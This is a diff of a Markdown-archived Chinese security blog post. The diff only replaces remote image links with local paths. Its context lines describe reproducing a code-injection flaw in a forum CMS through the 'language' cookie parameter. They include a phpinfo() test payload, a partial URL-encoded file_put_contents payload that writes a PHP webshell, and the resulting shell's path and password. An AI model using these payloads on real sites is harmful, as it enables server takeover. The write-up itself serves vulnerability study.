@@ -66,17 +66,17 @@ schema_version: "1"
 *   将源码复制到网站根目录下
     
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Cnm7wITedqJWTUM2bd9mFLBZztXibib5b5kV9RMxd1jkEgJb5CAnWouGv7NicaS6eUXBiaOfMb35icoOJiaOHEu3rPicw/640?wx_fmt=png)
+![](../../.resource/remote/ea47fa1b93c1f5742471f850e29e4f8ba4f59a3617e5c4ffc1131e5a4f877a25.png)
 
 *   在网页输入地址打开安装界面，然后一直下一步，中间记得填一下数据库账号密码
     
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Cnm7wITedqJWTUM2bd9mFLBZztXibib5b5icReZoA4YQmK1vYr0RkfhiafKuFvSxC1FnAaVNzicj6g6mqk9rx2Rkbdg/640?wx_fmt=png)
+![](../../.resource/remote/11dcdfcb03a65f6d35bbf4dc86b9de07a9819e861f117d04e59a8118a71a8a69.png)
 
 *   安装成功以后如下
     
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Cnm7wITedqJWTUM2bd9mFLBZztXibib5b54KFoiaia8rMqHNSOBrDBGO1spnOFJjqiaSzAI80sHy0v1k2RrfWCrldWQ/640?wx_fmt=png)
+![](../../.resource/remote/b63a5c67c9c47c5488ec1694ef504416dba852e5e9dad19274cecdf2e06cc935.png)
 
 测试
 --
@@ -86,12 +86,12 @@ schema_version: "1"
 *   打开 burp 抓取数据包
     
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Cnm7wITedqJWTUM2bd9mFLBZztXibib5b5RMdW1qE6oFy1WmRjLIHrFXRLtoPJmMosZF5O13CYQ6d99iaNG8uwdJA/640?wx_fmt=png)
+![](../../.resource/remote/00d351f25307c05c1e3888bf3433fc80eb619b4e351a7a30abc0d4eb635eff55.png)
 
 *   漏洞点在 language 参数处，其中 language 参数前的`f8ZX_2132_`为随机生成的 token，每个网站不同，先使用`phpinfo()`测试漏洞是否存在
     
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Cnm7wITedqJWTUM2bd9mFLBZztXibib5b5ftF9eibav4H1DicPHPd8ticCQJFprrGFD7HmXtsS1qeMbOxAKedcZv8qw/640?wx_fmt=png)
+![](../../.resource/remote/d00eef520b1cad35e751f3c3ae230e31794d11b5c70137e078a8167dcf13473a.png)
 
 *   测试 payload 为：`f8ZX_2132_language=sc'.phpinfo().'`
     
@@ -112,12 +112,12 @@ language=sc%27.file_put_contents%28%27{1}.php%27%2Curldecode%28%27%253c%253fphp%
 *   结果如下
     
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Cnm7wITedqJWTUM2bd9mFLBZztXibib5b558WljFFhvO32YYwLpwZJD94Yx9OuGCCqfrZ3ON7SNLBliaLMXCDgRIg/640?wx_fmt=png)
+![](../../.resource/remote/47b5996ecbd6f9031589d6aafef009270d8a642e709fc212ac3111c55ecbc046.png)
 
 *   webshell 地址为：`http://xx.xx.xx.xx/upload/webshell.php`，密码为：webshell。使用蚁剑连接即可
     
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Cnm7wITedqJWTUM2bd9mFLBZztXibib5b5F6Z2b2uKqDY8DbgVyTl5Lr6RvUCKYoBbS97gDWTTS1OiarDZ4g8ficiag/640?wx_fmt=png)
+![](../../.resource/remote/c87aebf0092eb24f4d8861f12e922d8a3e0de6d029bb011528741b4da3e67a24.png)
 
   
 
@@ -129,7 +129,7 @@ secteam 公众号
 
 长按识别二维码关注
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqKticW5ZWC15ibIkiassjrnzm49qKOiccGP2afCSib51VfB83AZYBQ0U09vmYVILSh2dlRXUiaojRYxDX0A/640?wx_fmt=jpeg)
+![](../../.resource/remote/c16dd65a38633ba3eb548e504c147f275599c4e6bdfc1b9942f45d37df851340.jpg)
 
 ---
 
